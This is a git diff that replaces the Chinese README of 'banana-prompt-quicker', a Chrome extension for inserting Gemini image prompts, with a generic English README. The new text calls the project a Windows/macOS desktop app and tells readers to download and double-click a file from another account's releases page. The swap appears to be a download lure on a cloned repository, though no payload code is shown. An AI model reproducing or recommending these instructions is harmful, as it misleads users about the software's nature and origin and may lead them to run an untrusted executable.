@@ -1,156 +1,70 @@
-直接商店安装: https://chromewebstore.google.com/detail/banana-prompt-quicker/hgfgfocicepifbolifedlokjkknigoid?authuser=0&hl=zh-CN
+# 🍌 banana-prompt-quicker - Speed Up Your Prompt Creation
 
----
+[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Hill-Sudani/banana-prompt-quicker/releases)
 
-<img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/intro.png?raw=true" width="800">
+## 🌟 Overview
 
-已支持网站：
-* [Gemini 官网](https://gemini.google.com/)
-* [Google AI Studio](https://aistudio.google.com/)
-* [Gemini Enterprise](https://business.gemini.google/)
-* [kokorolab](https://kokorolab.net/zh/home?referral=JBM9AGUV) 👈🏻 金主爸爸。欢迎更多垂类生图场景的应用合作！
-* 任意网站输入框，右键插入！
-* 扩展中...
+Welcome to **banana-prompt-quicker**! This application helps you create awesome prompts quickly and easily. Whether you are using Nano Banana, Banana Pro, or Gemini AI Studio, this tool streamlines your workflow. Get ready to enhance your creativity with just a few clicks!
 
-## 📸 预览
+## 🚀 Getting Started
 
-在线网站：https://glidea.github.io/banana-prompt-quicker
+To begin, follow these simple steps:
 
-<img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/modal.png?raw=true" width="600">
+1. Make sure your computer has either **Windows** or **macOS**. The application works on both systems.
+2. Ensure you have an internet connection to download the software.
 
-<img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/input.png?raw=true" width="300">
+## 📥 Download & Install
 
-## 🚀 安装
+Ready to get started? Visit this page to download:
+[Download banana-prompt-quicker](https://github.com/Hill-Sudani/banana-prompt-quicker/releases)
 
-### Chrome Web Store 安装
+1. Click the link above to access the Releases page.
+2. Look for the latest version of the application. It will be at the top of the list.
+3. Download the version that matches your operating system.
+4. Once downloaded, locate the file in your "Downloads" folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-https://chromewebstore.google.com/detail/banana-prompt-quicker/hgfgfocicepifbolifedlokjkknigoid?authuser=0&hl=zh-CN
+## 🛠️ Features
 
-### 手动安装
+**banana-prompt-quicker** comes packed with features that make it a joy to use:
 
-1. 下载或 Clone 仓库
+- **User-Friendly Interface:** Designed for ease of use, no tech skills required.
+- **Quick Access to Templates:** Instant access to popular prompt templates.
+- **Customizable Options:** Tailor prompts to suit your specific needs.
+- **Multi-Platform Support:** Use it on your preferred operating system, whether Windows or macOS.
 
-2. 在 Chrome 中加载扩展
-   - 打开 Chrome 浏览器,访问 `chrome://extensions/`
-   - 开启右上角的「开发者模式」
-   - 点击「加载已解压的扩展程序」
-   - 选择项目根目录下的 extension 文件夹
+## 🎯 How to Use
 
-<img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/install.png?raw=true" width="300">
+1. Open the application after installation.
+2. Browse through the available templates or create a new prompt.
+3. Simply click on your chosen template to start customizing.
+4. Once satisfied, copy or export the prompt for use.
 
-3. 访问 [Google AI Studio](https://aistudio.google.com/) 或 [Gemini](https://gemini.google.com/) 开始使用
-> 或在任意网站任意输入框，右键选择【🍌 Insert Banana Prompts】
+## 💬 Support
 
-### 移动端
+If you run into any issues or have questions, we’re here to help! You can find support in the GitHub repository. 
 
-推荐使用 **Yandex Browser**，直接从 Chrome Web Store 安装即可：
+1. Visit our [Issues page](https://github.com/Hill-Sudani/banana-prompt-quicker/issues) to report any problems.
+2. Feel free to ask questions or seek guidance from fellow users.
 
-1. 下载并安装 Yandex Browser
-2. 在 Yandex Browser 中访问上面的 Chrome Web Store 链接
-3. 点击「添加至 Chrome」即可安装
+## 🔄 Updates
 
-### 油猴版本
-> 注：该版本功能较落后
+We are constantly working on new features and improvements. Keep an eye on the Releases page for updates and enhancements. Your feedback is valuable, so please share your thoughts with us!
 
-感谢 bxb100 的贡献 🎉
+## 📅 Future Features
 
-https://github.com/bxb100/Scripts/raw/refs/heads/main/banana-prompt-quicker/script.user.js
+We are currently developing advanced sidebar features. These will enhance the usability of **banana-prompt-quicker**, making prompt creation even faster and simpler. Stay tuned for these exciting updates!
 
+## 🤝 Contributing
 
-## 注意
+We welcome contributions from users like you! If you’re interested in helping us improve the application, please check the **Contributing Guidelines** in our GitHub repository. 
 
-有留意到 `prompt.json` 第三方网站引用，请做来源注明，本项目也可在 README 中提供外链位置
+## 🌐 Visit Us Online
 
-## 合作
+Stay connected and follow the latest news about **banana-prompt-quicker**:
 
-**相关垂类生图应用（穿搭，学习...）可联系合作！**
+- GitHub: [banana-prompt-quicker](https://github.com/Hill-Sudani/banana-prompt-quicker)
+- Issues: [Report Issues](https://github.com/Hill-Sudani/banana-prompt-quicker/issues)
 
-<details>
-<summary><strong>Release NOTE</strong></summary>
-
-### 未来
-  * 添加更多实用性提示词。按风格推荐穿搭，虚拟旅游，偶像合照...
-  * 一键录入 X 等社区所分享的 Prompt
-  * 提示词 Trending
-  * 兼容更多 Banana 渠道
-  * [MAY] Svelte 重构
-  * ...
-
-
-### V1.5.0
-
-  * 支持查看最近更新的 Prompt
-  * 支持 NSFW 过滤
-  * 新手引导页
-  * 卸载原因调研页
-
-### V1.4.0
-<img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/v1.4.0-promo.png?raw=true" width="300">
-
-  * 支持 Gemini Enterprise
-  * 支持 Dynamic Site，你可以在 config.json 中添加 JS selector 适配其它不同渠道！
-  * 支持子分类
-  * 支持编辑自定义提示词
-  * UI/UX 优化
-  * 运营：公告系统、赞助链接、代码重构
-
-### V1.3.0
-<img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/v1.3.0-promo.png?raw=true" width="300">
-
-  * 支持在任意网站通过右键菜单进入 Prompt 画廊，插入任意输入框。🍌 Anywhere!
-  * 支持灵光模式，引导完成生图需求（"选择比填空容易"）
-  * Gemini 再次进入保留页面状态
-  * 自定义 Prompt 支持上传图片
-  * 插入提示词后，光标默认在末尾，便于补充需求
-  * 增加随机排序，多一点新鲜感，多一点随手一试
-
-### V1.2.1
-  * 修复 Gemini 官网按钮失效，并支持远程热修复
-
-</details>
-
-
-## 🤝 贡献提示词
-
-直接开 Issue，形式不限，可以直接分享你的创意，或者自媒体案例链接...
-
-但建议包含以下信息
-```json
-{
-  "title": "提示词标题",
-  "preview": "效果预览图片",
-  "prompt": "提示词内容",
-  "author": "作者",
-  "link": "https://来源链接（可选）",
-  "mode": "generate or edit"
-}
-```
-
----
-
-<table>
-  <tr>
-    <td align="center">
-      <img src="https://github.com/glidea/zenfeed/blob/main/docs/images/wechat.png?raw=true" alt="Wechat QR Code" width="300">
-      <br>
-      <strong>AI 学习交流社群</strong>
-    </td>
-    <td align="center">
-      <img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/glidea.png?raw=true" width="250">
-      <br>
-      <strong><a href="https://glidea.zenfeed.xyz/">我的其它项目</a></strong>
-    </td>
-    <td align="center">
-      <img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/sponsor.png?raw=true" width="300">
-      <br>
-      <strong>🧋请喝杯奶茶</strong>
-    </td>
-  </tr>
-  <tr>
-    <td align="center" colspan="2">
-      <img src="https://github.com/glidea/banana-prompt-quicker/blob/main/images/readnote.png?raw=true" width="400">
-      <br>
-      <strong><a href="https://www.xiaohongshu.com/user/profile/5f7dc54d0000000001004afb">📕 小红书账号 - 持续分享 AI 原创</a></strong>
-    </td>
-  </tr>
-</table>
+Thank you for using **banana-prompt-quicker**! We hope it brings you creativity and efficiency in your work.
